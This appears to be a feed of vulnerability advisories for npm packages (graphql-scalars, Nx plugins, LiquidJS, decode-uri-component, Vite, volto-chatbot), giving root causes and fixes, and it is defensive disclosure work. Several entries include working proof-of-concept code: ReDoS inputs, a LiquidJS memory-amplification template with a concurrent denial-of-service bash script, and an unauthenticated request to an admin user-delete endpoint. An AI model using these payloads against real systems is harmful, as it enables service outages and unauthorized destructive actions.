items.content_html:
Summary

The regular expression behind GraphQLPhoneNumber since 1.24.1 backtracks exponentially. A string made of a run of digits followed by one character that makes the match fail (for example "1".repeat(30) + "x") blocks the JavaScript thread for seconds, and every additional digit doubles the time.

graphql-js calls parseLiteral while validating a document and parseValue while coercing variables, so the regex runs for every request that merely contains such a value in a PhoneNumber position, before execution and before any authentication or authorization step of the server. One small unauthenticated request is enough to stall a server process.

Affected versions

  • graphql-scalars >= 1.24.1, <= 2.0.0 (2.0.0 is the current latest; the default branch still has the same pattern).
  • Not affected: 1.24.0 and the earlier versions I checked (1.22.4, 1.23.0), which use the linear /^\+[1-9]\d{6,14}$/.
  • Introduced by #2719 (c7f58da16, "PhoneNumber scalar is not fully compatible with E.164 format so updated regex to support phone number with extension"), released as 1.24.1 on 2025-01-29.

The payload was ran against 1.22.4, 1.23.0, 1.24.0, 1.24.1, 1.24.2, 1.25.0, 1.26.0 and 2.0.0: the first three reject it instantly, the other five show the exponential growth.

Root cause

src/scalars/PhoneNumber.ts:

const PHONE_NUMBER_REGEX = /^\+?\d{1,3}(\-|\x20)?\(?\d+\)?((\-|\x20)?\d+)+$/;

In \d+\)?((\-|\x20)?\d+)+$ the separator is optional, so a run of n digits can be split across the inner \d+ and the outer + iterations in a number of ways that is exponential in n. When the overall match fails, for instance on a trailing non-digit, the engine tries all of them.

Proof of concept

  1. The scalar alone (npm i graphql graphql-scalars@2.0.0):
import { GraphQLPhoneNumber } from 'graphql-scalars';

for (const ok of ['+41791234567', '079 123 45 67', '+1 (123) 456-7890', 'nope']) {
  try { GraphQLPhoneNumber.parseValue(ok); } catch {}
}
for (const digits of [24, 26, 28, 30]) {
  const start = performance.now();
  try { GraphQLPhoneNumber.parseValue('1'.repeat(digits) + 'x'); } catch {}
  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

digits Node 22.19.0 Node 26.10.0
24 0.10 s 0.07 s
26 0.41 s 0.29 s
28 1.63 s 1.14 s
30 6.59 s 4.62 s

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

  1. Through graphql-js, no server and no authentication: a schema with a single echo(phone: PhoneNumber) field, 26 digits + x, Node 22.19.0, warm:
literal (parseLiteral, validation) variable (parseValue, coercion)
graphql 16.14.2 0.41 s 0.43 s
graphql 17.0.2 0.41 s 0.83 s (evaluated twice)
  1. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial { __typename } request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

Impact

Denial of service. Any GraphQL server that exposes PhoneNumber on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). serialize uses the same regex, so unvalidated stored values returned through a PhoneNumber field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

Suggested fix

An equivalent pattern without ambiguous splits:

const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;

It accepts exactly the same strings as the current one, so there is no behaviour change: with N = (S?\d+)+ = (S?\d)+ a digit run is just repeated single-digit iterations, hence \d+\)?N = \d(\d*\))?N. Verification:

  • exhaustive comparison of old and new pattern on every string up to length 9 over 1 + - space ( ) x: 47,079,208 strings (1,832 accepted), 0 differences;
  • every sequence of up to 6 tokens from 1 11 111 1111 11111 + - space ( ) x: 1,948,717 strings (100,380 accepted), 0 differences;
  • adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly 10 million characters V8 aborts the match with a RangeError (stack) after about 25 ms instead of returning false.

A regression test that fails with the current implementation: GraphQLPhoneNumber.parseValue('1'.repeat(40) + 'x') must throw its validation error immediately; with the current pattern it does not return in any reasonable time.

Workarounds for users until a fix is released

  • Replace the scalar in the schema with one that uses the pattern above.
  • Run Node with --enable-experimental-regexp-engine-on-excessive-backtracks, or call v8.setFlagsFromString('--enable-experimental-regexp-engine-on-excessive-backtracks') before the regex first runs. V8 then falls back to its linear-time engine after excessive backtracking; verified on Node 22.19, 24.15 and 26.10. The flag is not accepted in NODE_OPTIONS.
  • Pinning graphql-scalars to <= 1.24.0 restores a linear pattern but changes which values are accepted (only + prefixed E.164).

Coordination

We have not disclosed this publicly. We maintain Unchained Engine (@unchainedshop/api), a downstream project that exposes this scalar on public input fields and will need to ship a mitigation of its own, so we would like to coordinate the timing of any public disclosure with you. Please let us know your preferred timeline, and whether you would like us to prepare a pull request (we can work in a temporary private fork if you enable one).

Summary

@nx/maven and @nx/gradle spawn their project-graph analyzers through a shell and interpolate plugin options read from nx.json straight into the command line. Because a shell parses the whole line, an option value containing shell syntax is executed as a command by any nx command that constructs the project graph. Anyone who clones a hostile repository, or who checks out a pull request that edits nx.json, runs the injected command with their own privileges.

Severity

A victim who runs an ordinary nx command in an attacker-supplied Maven or Gradle workspace gets code execution as themselves. In most such workspaces an attacker who can write nx.json can already run code through the repository's build files (./mvnw, pom.xml, and the Gradle equivalents), so the genuinely new exposure is narrow — for example CI building a fork's pull request where nx.json is writable but the build files are not. We have no evidence of exploitation in the wild.

Affected & Patched Versions

Package Vulnerable Patched
@nx/maven >= 22.0.2, < 22.7.9; >= 23.0.0, < 23.1.2 22.7.9, 23.1.2
@nx/gradle >= 21.0.0, < 22.7.9; >= 23.0.0, < 23.1.2 22.7.9, 23.1.2

[!IMPORTANT] Workspaces that register neither @nx/maven nor @nx/gradle in nx.json are unaffected — the vulnerable code only runs from those plugins' graph-construction paths, and no other Nx plugin shares this pattern.

Remediation

Upgrade to 22.7.9 (22.x line) or 23.1.2 (23.x line) or later:

nx migrate 23.1.2

Upgrade both nx and the affected plugin (@nx/maven and/or @nx/gradle). The plugin's fix depends on code that ships in the nx package, so bumping the plugin without a matching nx upgrade will not resolve it.

There is no configuration to change — upgrading is the whole fix. If you cannot upgrade yet, only run nx commands in repositories you trust, since a malicious nx.json can execute code on a vulnerable version.

Details

Both plugins spawn their analyzer through a shell and interpolate nx.json plugin options into the command, so those option values are shell source. For Maven the injectable value is the targetNamePrefix option; for Gradle it is broader, since every plugin option is mapped into a -P argument and arbitrary option names are accepted, making both the name and value of any option injectable.

items.content_html:
Summary

The replace_first filter in LiquidJS uses JavaScript's String.prototype.replace() which interprets $& as a backreference to the matched substring. The filter only charges memoryLimit for the input string length, not the amplified output. An attacker can achieve exponential memory amplification (up to 625,000:1) while staying within the memoryLimit budget, leading to denial of service.

Details

The replace_first filter in src/builtin/filters/string.ts:130-133 delegates to JavaScript's native String.prototype.replace(). This native method interprets special replacement patterns including $& (insert the matched substring), $' (insert the portion after the match), and $` (insert the portion before the match).

The filter calls memoryLimit.use(str.length) to account for the input string's memory cost, but the output string — potentially many times larger due to $& expansion — is never charged against the memory limit.

An attacker can build a 1MB string (within memoryLimit budget), then use replace_first with a replacement string containing 50 repetitions of $&. Each $& expands to the full matched string (1MB), producing a 50MB output that is not charged to the memory counter.

By chaining this technique across multiple variable assignments, exponential amplification is achieved:

Stage Input Size $& Repetitions Output Size Cumulative memoryLimit Charge
1 1 byte 50 50 bytes ~1 byte
2 50 bytes 50 2,500 bytes ~51 bytes
3 2,500 bytes 50 125 KB ~2.6 KB
4 125 KB 50 6.25 MB ~128 KB
5 6.25 MB 50 312.5 MB ~6.38 MB

Total amplification factor: ~625,000:1 (312.5 MB output vs. ~6.38 MB charged to memoryLimit).

Notably, the sibling replace filter uses str.split(pattern).join(replacement), which treats $& as a literal string and is therefore not vulnerable. The replace_last filter uses manual substring operations and is also safe. Only replace_first is affected.

// src/builtin/filters/string.ts:130-133 — VULNERABLE
export function replace_first (v: string, arg1: string, arg2: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)  // Only charges input
  return str.replace(stringify(arg1), arg2)  // $& expansion uncharged!
}

// src/builtin/filters/string.ts:125-129 — SAFE (for comparison)
export function replace (v: string, arg1: string, arg2: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)
  return str.split(stringify(arg1)).join(arg2)  // split/join: $& treated as literal
}

PoC

Prerequisites:

  • npm install liquidjs@10.24.0
  • An application that renders user-provided Liquid templates (CMS, newsletter editor, SaaS platform, etc.)

Save the following as poc_replace_first_amplification.js and run with node poc_replace_first_amplification.js:

const { Liquid } = require('liquidjs');

(async () => {
  const engine = new Liquid({ memoryLimit: 1e8 }); // 100MB limit

  // Step 1 — Verify $& expansion in replace_first
  console.log('=== Step 1: $& expansion in replace_first ===');
  const step1 = '{{ "HELLO" | replace_first: "HELLO", "$&-$&-$&" }}';
  console.log('Result:', await engine.parseAndRender(step1));
  // Output: "HELLO-HELLO-HELLO" — $& expanded to matched string

  // Step 2 — Verify replace (split/join) is safe
  console.log('\n=== Step 2: replace is safe ===');
  const step2 = '{{ "ABCDE" | replace: "ABCDE", "$&$&$&" }}';
  console.log('Result:', await engine.parseAndRender(step2));
  // Output: "$&$&$&" — $& treated as literal

  // Step 3 — 5-stage exponential amplification (50x per stage)
  console.log('\n=== Step 3: Exponential amplification (625,000:1) ===');
  const amp50 = '$&'.repeat(50);
  const step3 = [
    '{% assign s = "A" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{{ s | size }}'
  ].join('');

  const startMem = process.memoryUsage().heapUsed;
  const result = await engine.parseAndRender(step3);
  const endMem = process.memoryUsage().heapUsed;

  console.log('Output string size:', result.trim(), 'bytes');  // "312500000"
  console.log('Heap increase:', ((endMem - startMem) / 1e6).toFixed(1), 'MB');
  console.log('Amplification: ~625,000:1 (1 byte input -> 312.5 MB output)');
  console.log('memoryLimit charged: < 7 MB (only input lengths counted)');
})();

Expected output:

=== Step 1: $& expansion in replace_first ===
Result: HELLO-HELLO-HELLO

=== Step 2: replace is safe ===
Result: $&$&$&

=== Step 3: Exponential amplification (625,000:1) ===
Output string size: 312500000 bytes
Heap increase: ~625.0 MB
Amplification: ~625,000:1 (1 byte input → 312.5 MB output)
memoryLimit charged: < 7 MB (only input lengths counted)

The memoryLimit of 100MB is completely bypassed — 312.5 MB is allocated while only ~6.38 MB is charged to the memory counter.

Demonstrated Denial of Service (concurrent attack)

After confirming the single-request PoC, launch 20 concurrent attacks + legitimate user requests to measure actual service disruption.

Raw Liquid template payload sent by attacker:

{% assign s = "A" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{{ s }}

$& is a JavaScript String.prototype.replace() backreference pattern that inserts the entire matched string. Each stage amplifies 50x → 5 stages = 50^5 = 312,500,000 characters (~312.5MB). {{ s }} forces the full output into the HTTP response, keeping memory allocated during transfer and blocking the Node.js event loop.

#!/bin/bash
# DoS demonstration: 20 concurrent attacks + legitimate user latency measurement

DOLLAR='$&'
REP50=$(printf "${DOLLAR}%.0s" {1..50})
PAYLOAD="{% assign s = \"A\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{{ s }}"

echo "=== Advisory 2 DoS: 20 concurrent + normal user ==="

# 20 DoS attack requests (per-request timing)
for i in $(seq 1 20); do
  (
    t1=$(date +%s%3N)
    curl -s -o /dev/null --max-time 120 -X POST "http://<app>/newsletter/preview" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "template=$PAYLOAD"
    t2=$(date +%s%3N)
    echo "DoS[$i]: $(( t2 - t1 ))ms"
  ) &
done

# Legitimate user requests at 0s, 3s, 6s
(
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[0s]: $(( t2 - t1 ))ms"
) &

(
  sleep 3
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[3s]: $(( t2 - t1 ))ms"
) &

(
  sleep 6
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[6s]: $(( t2 - t1 ))ms"
) &

wait
echo "=== Done ==="

Empirical results (Node.js v20.20.1, LiquidJS 10.24.0):

Normal[0s]:  13047ms  ← request sent concurrently with attack — 13s delay
Normal[3s]:  10124ms  ← still blocked 3 seconds later — 10s delay
Normal[6s]:   7186ms  ← still blocked 6 seconds later — 7s delay
DoS[1]:      14729ms
DoS[2-20]:   17747ms ~ 25353ms

With 20 concurrent requests, legitimate users experience up to 13-second delays. Requests sent 6 seconds after the attack began still take 7 seconds, confirming sustained service disruption throughout the ~25-second attack window. Each attack request costs only ~500 bytes.

HTTP Reproduction (for applications that accept user templates)

curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \"HELLO\" | replace_first: \"HELLO\", \"$&-$&-$&\" }}"}'

# replace is safe — should return literal "$&$&$&"
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \"ABCDE\" | replace: \"ABCDE\", \"$&$&$&\" }}"}'

# 5-stage 50x amplification — produces ~312.5MB response
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% assign s = \"A\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{{ s | size }}"}'

# 20 concurrent DoS attack requests
for i in $(seq 1 20); do
  curl -s -o /dev/null --max-time 120 -X POST "http://<app>/render" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode 'template={% assign s = "A" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{{ s }}' &

# Legitimate user request (concurrent)
curl -w "Normal: %{time_total}s\n" -s -o /dev/null --max-time 60 -X POST "http://<app>/render" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'template=<h1>Hello</h1>' &

Summary

decodeUriComponent() takes quadratic time on malformed input that has many distinct percent-encoded runs. A single unauthenticated request of about 224 KB can block the Node.js event loop for about 20 seconds. Version 0.5.0, the release that fixed CVE-2026-45822, is affected.

Details

When native decodeURIComponent throws, decodeUriComponent() falls back to customDecodeURIComponent (index.js:122). That function:

  1. Scans the input for every run of percent-encoded bytes (e.g. %C3%A5) and stores each distinct run, with its decoded value, in a lookup table (index.js:130-144).
  2. Runs one full-string input.replace(new RegExp(key, 'g'), …) per table entry (index.js:154).

With K distinct runs in an input of length L, that's K regex compilations and K full scans of the string, so O(K·L). An attacker controls both K and L, and K grows with L. One malformed sequence such as a trailing %zz is enough to force the fallback path.

The 0.5.0 fix for CVE-2026-45822 (fa479da) replaced the recursive decode() routine with a linear scanner, but left this replacement loop unchanged.

Proof of concept

Running the following code takes ~20 seconds.

import decodeUriComponent from 'decode-uri-component';

let payload = '';
for (let i = 0; i < 32000; i++) {
    const high = Math.floor(i / 256).toString(16).padStart(2, '0');
    const low = (i % 256).toString(16).padStart(2, '0');
    payload += `%${high}%${low}x`; // distinct run each iteration
}
payload += '%zz'; // forces the fallback decoder

console.time('decode');
decodeUriComponent(payload); // ~224 KB
console.timeEnd('decode');

Impact

This is an availability issue only and there's no confidentiality or integrity impact. Any application that passes untrusted input to decodeUriComponent(), directly or through a dependency such as query-string, can be made unresponsive. Because Node.js runs on one thread, one request stalls every other client.

The worst case needs input well beyond URL length limits. Node's default 16 KB header limit keeps payloads passed in via a URL query string to roughly 40 ms per request. Applications that decode request bodies are fully exposed, for example form bodies parsed with query-string.parse().

References

  • https://github.com/SamVerschueren/decode-uri-component/security/advisories/GHSA-qr28-fpjm-wq7f
  • https://nvd.nist.gov/vuln/detail/CVE-2026-118664
  • https://github.com/SamVerschueren/decode-uri-component/commit/fad01d65b93bd3f2f0dc32dfd8d57a38b57bc608
  • https://github.com/SamVerschueren/decode-uri-component/releases/tag/v0.5.1
  • https://github.com/advisories/GHSA-qr28-fpjm-wq7f

Summary

The contents of files that are specified by server.fs.deny can be returned to the browser. This is the same as https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r.

Impact

Only apps that match the following conditions are affected:

  • explicitly exposes the Vite dev server to the network (using --host or server.host config option)
  • the sensitive file exists in the allowed directories specified by server.fs.allow
  • the sensitive file is denied with a pattern that matches a file by server.fs.deny

On the Vite dev server, files that should be blocked by server.fs.deny (e.g., .env, *.crt) can be retrieved with HTTP 200 responses when query parameters such as ?raw, ?import&raw, or ?import&url&inline are appended.

items.content_html:
Unauthenticated Danswer API Confused Deputy Proxy in @eeacms/volto-chatbot

Summary

@eeacms/volto-chatbot exposes an Express middleware route (**/_v1_da/**) that accepts unauthenticated HTTP requests from any network client and proxies them to the configured upstream Danswer API, automatically attaching the server-side service credentials (DANSWER_API_KEY or session cookie). Because no authorization check, path allowlist, or method restriction is applied before the upstream request is issued, an unauthenticated attacker can invoke arbitrary Danswer API operations — including privileged admin endpoints — as the configured service account. This is a classic Confused Deputy attack: the Volto proxy acts as a deputy that carries credentials on behalf of the attacker.

Details

The vulnerability is introduced across two source files in @eeacms/volto-chatbot@2.0.3.

Route registration (src/index.js:15):

middleware.all('**/_v1_da/**', proxyMiddleware);

The wildcard pattern matches every HTTP method and any sub-path, and no authentication middleware is chained before proxyMiddleware. This means all requests reaching any /_v1_da/ path are forwarded without any identity check.

Unvalidated path extraction and upstream URL construction (src/middleware.js:228-230):

const path = req.url.replace('/_v1_da/', '/');
const reqUrl = `${process.env.DANSWER_URL || ''}/api${path}`;

The attacker-controlled req.url is transformed into the upstream Danswer path with a simple string replace. There is no allowlist of permitted paths, no restriction on HTTP methods, and no validation of the resulting URL. The attacker therefore fully controls which Danswer endpoint is called and with which HTTP method.

Credential attachment and forwarding (src/middleware.js:164, src/middleware.js:169, src/middleware.js:202):

// Session-cookie path (line 164):
headers = { Cookie: cached_auth_cookie, ... }

// API-key path (line 169):
Authorization: 'Bearer ' + api_key,

// Sink — final upstream dispatch (line 202):
const response = await fetch(url, options, req.body);

After constructing the URL from attacker-supplied input, the middleware attaches the server-side Danswer credentials (either a cached login session cookie or a Bearer API key) and dispatches the request. The response from Danswer is then relayed back to the unauthenticated client.

Complete data flow (source → sink):

  1. src/index.js:15 — all **/_v1_da/** paths registered to proxyMiddleware with no auth guard (source: external HTTP request).
  2. src/middleware.js:228 — req.url used directly to derive the upstream path without allowlist.
  3. src/middleware.js:230 — attacker-controlled path appended to ${DANSWER_URL}/api.
  4. src/middleware.js:164 / src/middleware.js:169 — server-side session cookie or API key attached.
  5. src/middleware.js:202 — fetch(url, options, req.body) sends the fully-credentialed request to the Danswer backend (sink).

This vulnerability is present whenever the add-on middleware is installed and DANSWER_API_KEY or DANSWER_USERNAME/DANSWER_PASSWORD is configured — conditions required for normal, documented operation of the package.

PoC

The following steps reproduce the vulnerability using the Docker-based test harness provided with this report.

Prerequisites:

  • Docker installed
  • Python 3 with the requests library

Step 1 — Build the Docker image (from the npmAI_719_eea__volto-chatbot/ parent directory):

docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-proxy \
  reports/npmAI_719_eea__volto-chatbot

The image packages the unmodified src/middleware.js from @eeacms/volto-chatbot@2.0.3, a minimal Express server that wires the vulnerable middleware, and an in-container mock Danswer server that echoes every received request as JSON. The environment variable DANSWER_API_KEY=supersecret is set to simulate a real deployment.

Step 2 — Start the container:

docker run --rm -d -p 3000:3000 --name vuln001-test vuln001-proxy

This launches both the Volto proxy (port 3000) and the mock Danswer server (port 18080) inside the container.

Step 3 — Run the PoC exploit script:

python3 vuln-001/poc.py 127.0.0.1 3000

What the script does:

  1. Waits for the proxy to accept TCP connections.
  2. Sends an unauthenticated POST request with a JSON body to the admin-only Danswer endpoint via the proxy:
POST http://127.0.0.1:3000/_v1_da/admin/users/delete
Content-Type: application/json

{"id": "victim-user-123"}

No Authorization or Cookie header is sent by the client.

Expected output (exploit confirmed):

[+] === EXPLOIT CONFIRMED — PASS ===
[+] Decisive evidence:
    1. Attacker-controlled path reached upstream : url='/api/admin/users/delete'
    2. Server-side API key forwarded (no client auth) : authorization='Bearer supersecret'
    3. Attacker-controlled HTTP method forwarded : method='POST'

The mock Danswer server receives POST /api/admin/users/delete with Authorization: Bearer supersecret — proving that the attacker controlled both the upstream path and the HTTP method while the server silently attached its own credentials.

Equivalent manual curl command (without Docker):

# Terminal 1 — mock Danswer server
node - <<'NODE'
require('http').createServer((req, res) => {
  let b = ''; req.on('data', c => b += c);
  req.on('end', () => {
    res.setHeader('content-type', 'application/json');
    res.end(JSON.stringify({
      method: req.method, url: req.url,
      authorization: req.headers.authorization || null,
      body: b
    }));
  });
}).listen(18080, () => console.log('mock Danswer on :18080'));
NODE

# Terminal 2 — Volto with Danswer credentials configured
DANSWER_URL=http://127.0.0.1:18080 DANSWER_API_KEY=secret yarn start

# Terminal 3 — unauthenticated exploit request
curl -i -X POST 'http://localhost:3000/_v1_da/admin/users/delete' \
  -H 'Content-Type: application/json' \
  --data '{"id":"victim-user-123"}'

The response body will contain "authorization":"Bearer secret" and "url":"/api/admin/users/delete", confirming the Confused Deputy.

Impact

This is a Confused Deputy / Missing Authorization vulnerability. The Volto proxy acts as a privileged deputy that forwards attacker-supplied requests to the Danswer backend while silently attaching its own service credentials.

Who is impacted:

Any deployment of @eeacms/volto-chatbot that:

  • has the package's Express middleware installed (default when the add-on is active), AND
  • has DANSWER_API_KEY or DANSWER_USERNAME/DANSWER_PASSWORD configured (required for the add-on to function at all).

Because these conditions are satisfied in every normal production deployment of the package, the vulnerability is effectively default-on.

Concrete attacker capabilities depend on the Danswer service account's permissions but include:

  • High Confidentiality impact — reading any Danswer endpoint accessible to the service account, including documents, user data, conversation history, and configuration.
  • Low–High Integrity impact — invoking write/mutate endpoints such as POST /admin/users/delete, POST /chat/create-chat-session, or any other writable Danswer API path as the service account.
  • No Authentication required — the attacker needs only network access to the Volto server (port 3000); no user account, cookie, or token is required.

The vulnerability is exploitable by any unauthenticated network attacker, including anonymous internet users if the Volto server is publicly reachable.

Reproduction artifacts

Dockerfile

# Dockerfile for VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy
#
# Build context: the parent directory (npmAI_719_eea__volto-chatbot/)
#   docker build -f vuln-001/Dockerfile -t vuln001-proxy .
#
# Run:
#   docker run --rm -p 3000:3000 vuln001-proxy

FROM node:18-alpine

WORKDIR /app

# Install production dependencies required by the vulnerable middleware and test harness
RUN npm init -y && npm install --save \
    express@4 \
    superagent@8 \
    node-fetch@2 \
    debug@4 \
    @babel/core@7 \
    @babel/register@7 \
    @babel/preset-env@7

# Copy the vulnerable middleware source (unmodified from repo)
COPY repo/src/middleware.js /app/src/middleware.js

# Copy the test harness
COPY vuln-001/test_server.js /app/test_server.js

# Point the proxy at the in-container mock Danswer server.
# DANSWER_API_KEY is the secret the server attaches to every upstream request.
ENV DANSWER_URL=http://127.0.0.1:18080
ENV DANSWER_API_KEY=supersecret

EXPOSE 3000

CMD ["node", "test_server.js"]

poc.py

#!/usr/bin/env python3
"""
Proof-of-Concept: VULN-001
Title:  Unauthenticated Danswer API Confused Deputy Proxy
CWE:    CWE-862 — Missing Authorization
CVSS:   8.2 (High)  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

Vulnerability:
    src/index.js:15 registers  middleware.all('**/_v1_da/**', proxyMiddleware)
    with NO authentication guard.  src/middleware.js:228-230 derives the
    upstream Danswer API path directly from req.url without any allowlist,
    then attaches the server-side DANSWER_API_KEY (or session cookie) before
    calling fetch().  An unauthenticated attacker therefore controls:
        - the upstream Danswer API path   (e.g. /admin/users/delete)
        - the HTTP method                 (POST, DELETE, …)
        - the request body
    while the server silently adds its own credentials.

Exploit flow:
    Attacker --(unauthenticated POST /_v1_da/admin/users/delete)--> Volto proxy
    Volto proxy --(POST /api/admin/users/delete  Authorization: Bearer <key>)--> Danswer

Usage:
    python3 poc.py [proxy_host] [proxy_port]
    Default: 127.0.0.1  3000
"""

import json
import socket
import sys
import time

import requests

# ── Configuration ──────────────────────────────────────────────────────────────
PROXY_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PROXY_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
PROXY_BASE = f"http://{PROXY_HOST}:{PROXY_PORT}"

# Attacker-chosen admin-only endpoint — no credentials sent by the client.
ATTACK_PATH    = "/_v1_da/admin/users/delete"
ATTACK_PAYLOAD = {"id": "victim-user-123"}


# ── Helpers ────────────────────────────────────────────────────────────────────
def wait_for_port(host: str, port: int, timeout: int = 40) -> bool:
    """Return True when a TCP connection succeeds within *timeout* seconds."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(1)
    return False


def run_exploit() -> bool:
    print("=" * 64)
    print("VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy")
    print("=" * 64)
    print(f"[*] Proxy base   : {PROXY_BASE}")
    print(f"[*] Attack path  : {ATTACK_PATH}")
    print(f"[*] Attack body  : {json.dumps(ATTACK_PAYLOAD)}")
    print(f"[*] No client auth headers will be sent.")
    print()

    # Wait for the proxy server to accept connections.
    print(f"[*] Waiting for proxy on {PROXY_HOST}:{PROXY_PORT} ...")
    if not wait_for_port(PROXY_HOST, PROXY_PORT, timeout=40):
        print("[-] Proxy did not become reachable within 40 s. FAIL.")
        return False
    print("[+] Proxy is reachable.")

    # Additional brief wait to let the Node event loop fully initialise.
    time.sleep(1)

    # Send the exploit request — zero client-side authentication.
    exploit_url = f"{PROXY_BASE}{ATTACK_PATH}"
    print(f"[*] Sending unauthenticated POST → {exploit_url}")
    try:
        resp = requests.post(
            exploit_url,
            json=ATTACK_PAYLOAD,
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
    except requests.exceptions.RequestException as exc:
        print(f"[-] HTTP request failed: {exc}")
        return False

    print(f"[*] HTTP status : {resp.status_code}")
    print(f"[*] HTTP body   : {resp.text[:800]}")
    print()

    # Parse the echo from the mock Danswer server.
    try:
        body = resp.json()
    except ValueError:
        print("[-] Response is not valid JSON — cannot verify exploit. FAIL.")
        return False

    auth_header = body.get("authorization") or ""
    upstream_url = body.get("url") or ""
    method = body.get("method") or ""

    print("[*] Fields echoed by mock Danswer upstream:")
